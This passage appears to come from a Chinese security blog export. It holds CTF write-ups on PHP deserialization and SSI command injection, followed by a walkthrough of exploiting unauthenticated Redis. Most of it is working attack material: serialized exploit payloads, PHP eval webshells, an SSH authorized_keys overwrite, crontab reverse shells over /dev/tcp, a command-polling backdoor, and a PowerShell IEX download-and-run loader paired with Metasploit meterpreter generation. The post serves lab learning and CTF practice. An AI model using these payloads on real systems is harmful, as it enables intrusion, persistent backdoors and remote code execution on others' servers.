class="line">$hack-&gt;source-&gt;str-&gt;p=new Modifier();</span><br><span class="line">echo urlencode(serialize($hack));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后要使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</p></blockquote><p><img src="C:/Users/1/Desktop/image-20210908203632749.png" alt="image-20210908203632749"></p><p>参考</p><blockquote><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">https://blog.csdn.net/weixin_43952190/article/details/106016260</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/e40b94f24361">https://www.jianshu.com/p/e40b94f24361</a></p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/109877324">https://blog.csdn.net/weixin_45785288/article/details/109877324</a></p></blockquote><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>考点  反序列化  </p><p>打开扫目录啥也没有  源码中发现php   发现反序列化函数 和魔法函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>简单审计后发现  可以通过<code>__destruct函数中的 echo $b($a);</code>进行利用  </p><p>具体使用assert函数 函数会将字符串当做代码执行 利用此可以传马</p><p>即给B传参为assert  a传参为一句话</p><p>exp为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = new HelloPhp();</span><br><span class="line">$test-&gt;b = &#x27;assert&#x27;;</span><br><span class="line">$test-&gt;a = &#x27;eval($_POST[mbg]);&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($test));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行后</p><p><img src="image-20210910201645407.png" alt="image-20210910201645407"></p><p>在  phpinfo中找到</p><p><img src="image-20210910202110284.png" alt="image-20210910202110284"></p><p><img src="image-20210910202139791.png" alt="image-20210910202139791"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫到index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要找 开头是<code>6d0bc1</code>的密文就能登录了  用刚学的三脚猫python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1000000000):</span><br><span class="line">    a = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"></span><br><span class="line">    if a[0:6] == &#x27;6d0bc1&#x27;:</span><br><span class="line">        print(i)</span><br><span class="line">        print(a)</span><br></pre></td></tr></table></figure><p><img src="image-20210910203647633.png" alt="image-20210910203647633"></p><p>找一个顺眼的登上去  </p><p>抓包发现<img src="image-20210910204033587.png" alt="image-20210910204033587"></p><p>访问</p><p><img src="image-20210910204242243.png" alt="image-20210910204242243"></p><p><img src="image-20210910204327451.png" alt="image-20210910204327451"></p><p>经过查阅资料和大佬的wp</p><p>，<code>shtml</code>文件表示服务器当前开启了<strong>SSI</strong>与<strong>CGI</strong>支持，可以使用<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>语法执行命令，<a href="https://www.cnblogs.com/yuzly/p/11226439.html">参考资料</a><br>题目中<code>username</code>被写入了<code>shtml</code>文件，所以将其值修改为：<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>：</p><p>发包</p><p><img src="image-20210910205303154.png" alt="image-20210910205303154"></p><p>进去看看</p><p><img src="image-20210910205209777.png" alt="image-20210910205209777"></p><p>查看上个目录  之后就是  常规命令执行了</p><p><img src="image-20210910205358081.png" alt="image-20210910205358081"></p><p><img src="image-20210910205453738.png" alt="image-20210910205453738"></p><p><img src="image-20210910205518442.png" alt="image-20210910205518442"></p><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权复现与利用</title>
      <link href="/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h1><p>REmote DIctionary Server(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。。</p><p> Redis 与其他它key - value 缓存产品有以下三个特点：</p><ul><li><p>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</p></li><li><p>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</p></li><li><p>Redis支持数据的备份，即master-slave模式的数据备份。</p><span id="more"></span></li></ul><p>　　Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>漏洞的产生条件有以下两点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 </span><br></pre></td></tr></table></figure><p>漏洞的危害</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure><p><strong>复现过程</strong></p><p>配置 </p><p>攻击端A centos </p><p>靶机B centos</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1）解压安装包：tar xzf redis-2.8.17.tar.gz进入redis目录：cd redis-2.8.17安装：make</span><br><span class="line">2）make结束后，进入src目录：cd src，</span><br><span class="line">将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">3）返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下：</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">4）使用/etc/目录下的reids.conf文件中的配置启动redis服务：</span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">服务启动成功，我们克隆这台虚拟机</span><br><span class="line">一台作为攻击机192.168.43.99</span><br><span class="line">一台作为靶机192.168.43.159</span><br><span class="line">启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了</span><br><span class="line">关闭redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">启动redis-server</span><br></pre></td></tr></table></figure><p>靶机启动redis后可以使用netstat -ntlp 查看是否开启了6379端口</p><p><img src="image-20210818163735678.png" alt="image-20210818163735678"></p><p>一般的话也可以用nmap</p><p><code>nmap -A -p 6379 -script redis-info 192.168.43.159</code></p><p><img src="image-20210818164007034.png" alt="image-20210818164007034"></p><p><code>./redis-cli -h 192.168.43.159</code></p><p>过程中 如果遇到 <code>No route to host</code></p><p><img src="E:/机密文件/hexo/blog/source/_posts/Redis未授权访问漏洞复现与利用/image-20210818163444178.png" alt="image-20210818163444178"></p><p>关闭防火墙<code>systemctl stop firewalld.service</code></p><p>可以<code>iptables -F</code> #删除过滤规则，不建议</p><p>后来发现也可以<code>firewall-cmd --zone=public --add-port=6379/tcp --permanent</code>开启6379端口然后重启</p><p><code>firewall-cmd --reload    </code></p><p>果然是防火墙的问题<br>可是真正的攻击 对方肯定不会关防火墙的<br>这里只是对 redis 未授权进行复现所以不考虑那么多</p><p><img src="image-20210818163530557.png" alt="image-20210818163530557"></p><p><img src="image-20210818163503309.png" alt="image-20210818163503309"></p><p>1)查看敏感信息</p><p><code>192.168.43.159:6379&gt;info</code></p><p><img src="image-20210818164146071.png" alt="image-20210818164146071"></p><p> 2）查看key和对应的值</p><p><code>keys *</code></p><p><img src="image-20210818184823879.png" alt="image-20210818184823879"></p><h1 id="SSH写入一句话木马"><a href="#SSH写入一句话木马" class="headerlink" title="SSH写入一句话木马"></a>SSH写入一句话木马</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，并未登陆验证 </span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限 （我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）</span><br></pre></td></tr></table></figure><p>靶机在 /var/www/html/uploads这个目录下。<br>执行下列命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.5.135</span><br><span class="line">config set dir  /var/www/html/uploads</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp=fopen(&#x27;bmjoker.php&#x27;,&#x27;w&#x27;);</span><br><span class="line">fwrite($fp,&#x27;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#x27;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20210818190426780.png" alt="image-20210818190426780"></p><p>由于我的靶机上没网站，所以这里就贴个别人的图片记录一下</p><p><img src="image-20210818185926772.png" alt="image-20210818185926772"></p><p>低权也可尝试利用phpinfo的信息和默认路径操作</p><h1 id="SSH免密码登录"><a href="#SSH免密码登录" class="headerlink" title="SSH免密码登录"></a>SSH免密码登录</h1><p><code>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</code></p><p>靶机B创建.ssh文件夹</p><p><code>mkdir /root/.ssh</code></p><p>攻击机A</p><p>生成秘钥 密码设置为空</p><p><code>ssh-keygen -t rsa</code></p><p><img src="image-20210818164621282.png" alt="image-20210818164621282"></p><p>方法一：</p><p>进入.ssh目录：cd .ssh/，将生成的公钥保存到key.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>)&gt;key.txt</span><br></pre></td></tr></table></figure><p><img src="image-20210818164748446.png" alt="image-20210818164748446"></p><p>将key.txt写入redis（使用redis-cli -h ip命令连接主机A，将文件写入）</p><p><code>cat key.txt |redis-cli -h 192.168.43.159 -x set crack</code></p><p><img src="image-20210818165147458.png" alt="image-20210818165147458"></p><p>远程登录主机A的redis服务：redis-cli -h 192.168.0.146 并使用CONFIG GET dir命令得到redis备份的路径</p><p><code>config get dir</code></p><p>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）</p><p><code>config set dir /root/.ssh</code></p><p>设置上传公钥的备份文件名字为authorized_keys</p><p><code>onfig set dbfilename authorized_keys</code></p><p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出，至此成功写入ssh公钥到靶机</p><p><code>config get dbfilename</code></p><p>可以在 靶机B /root/.ssh 目录下查看 authorized_keys</p><p><img src="image-20210818165320501.png" alt="image-20210818165320501"></p><p>方法二：</p><p>生成公钥私钥<br>  <code>ssh-keygen -t rsa</code><br>  一路回车</p><p>攻击机操作靶机Redis</p><p>指定目录<br><code>config set dir /root/.ssh</code><br>指定文件名<br><code>config set dbfilename authorized_keys</code><br>设置公钥内容<br><code>set x &quot;\n\n\nssh-rsaaAAAAB3NzaC1yc2EAAAADAQABAAABAQDET52Uo7NcYs0eSlt0MHrvxBUVVcN52Lr22MRwQdEu4gbqLEKn717BreUu2Vj+4x9Rsveip4aWMxddwbQgrHu7ILVqQSekkn8iUCNpq+oMAjZDnfOhkfLWZZKbrs/stb9FJ/uyOy0vXb9A5xIGdSBS8lBO0xiJc/EohNAr6eyF/U652Ir3yLvnFBWAQwg5ptoYY4JOsy8VcTbYvEV4IIFnPVMVF+IXitLczsVhCEVcNS3yl4dt6wbmRJwE+yVUMyUcFTSInOhkDCAoDsf4E6Cmbrme4yciUdVSHJrRtx8f216Ww4BL325oARE7OS0oefGQbQd6VSGa3Sdm4sYBdwoH 1@localhost.localdomain\n\n\n&quot;</code><br>保存</p><p><code>save</code></p><p>开启 ssh 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure><p><code>ssh -i id_rsa 192.168.43.159</code></p><p>ssh 未授权登录成功</p><p>方法一的</p><p><img src="image-20210818184700453.png" alt="image-20210818184700453"></p><p>方法二的</p><p><img src="image-20210818173430077.png" alt="image-20210818173430077"></p><p><img src="image-20210818174116364.png" alt="image-20210818174116364"></p><p>看到确实ip是靶机的，</p><h1 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h1><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p><p>攻击端监听一个端口</p><p>nc -lvnp 4444</p><p>连接redis，写入反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.43.159 set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.43.159/4444 0&gt;&amp;1\n\n&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron </span><br><span class="line"></span><br><span class="line">config set dbfilename root </span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>过一分钟左右就可以收到shell</p><p>利用crontab反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/114.114.114.114/53 0&gt;&amp;1nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br></pre></td></tr></table></figure><p>利用crontab创建文件 /tmp/888</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall # 为了方便测试 </span><br><span class="line">redis-cli set test &#x27;test&#x27; </span><br><span class="line">redis-cli set my &#x27;mymymymymymymymymymymymy&#x27; </span><br><span class="line">redis-cli set word &#x27;wordwordwordwordwordword&#x27; </span><br><span class="line">redis-cli set hello &#x27;ringzero&#x27; </span><br><span class="line">redis-cli set word1 &#x27;word1word1word1word1word1word1&#x27; </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/touch /tmp/888nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br><span class="line">redis-cli flushall </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/touch /tmp/888nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br></pre></td></tr></table></figure><p>二次改写crontab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall </span><br><span class="line">redis-cli set 2 &#x27;;a=`redis-cli get c`;&#x27; </span><br><span class="line">redis-cli set 1 &#x27;id;redis-cli set r `$a`;#&#x27; </span><br><span class="line">redis-cli config set dir /tmp/ </span><br><span class="line">redis-cli config set dbfilename w </span><br><span class="line">redis-cli save </span><br><span class="line">redis-cli set c whoami</span><br></pre></td></tr></table></figure><p>利用第一步的写crontab步骤，完成下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot; &quot; &gt; /tmp/zz </span><br><span class="line">cat /tmp/w &gt;&gt; /tmp/zz </span><br><span class="line">/bin/sh /tmp/zz </span><br><span class="line">redis-cli get r</span><br></pre></td></tr></table></figure><p>控制 /var/spool/cron/root 和 /tmp/zz</p><p> 最终实现，每10秒从redis的c变量读入要执行的命令，再将执行结果写入变量r</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * sleep 10;/bin/sh /tmp/zz</span><br></pre></td></tr></table></figure><p>windows利用方式（转自90sec）</p><p><strong>redis</strong> 官方未发布windows版本，但是野外存在redis/win版本。</p><p>在测试时发现一windows版本redis，遂开始搞。</p><p>直接上利用，基于msf:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@weisuo.org:~# cat hta-psh.txt </span><br><span class="line"> &lt;scRipt language=&quot;VBscRipT&quot;&gt;CreateObject(&quot;WscrIpt.SheLL&quot;).Run &quot;powershell -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString(&#x27;http://119.91.129.12:8080/1.ps1&#x27;)&quot;&lt;/scRipt&gt;</span><br><span class="line">[url=mailto:root@weisuo.org]root@weisuo.org[/url]:~#  cat hta-psh.txt |redis-cli -x -h 192.168.138.27 set a</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>hta-psh.txt 对一些字符串进行变通，如不，在写入时会导致字符串丢失。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#msfconsole </span><br><span class="line">use payload/windows/meterpreter/reverse_tcp</span><br><span class="line">generate -t hta-psh -f /var/www/1.ps1</span><br><span class="line">#之后起个handle，略</span><br></pre></td></tr></table></figure><p>修改1.ps1，文件内容大概如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 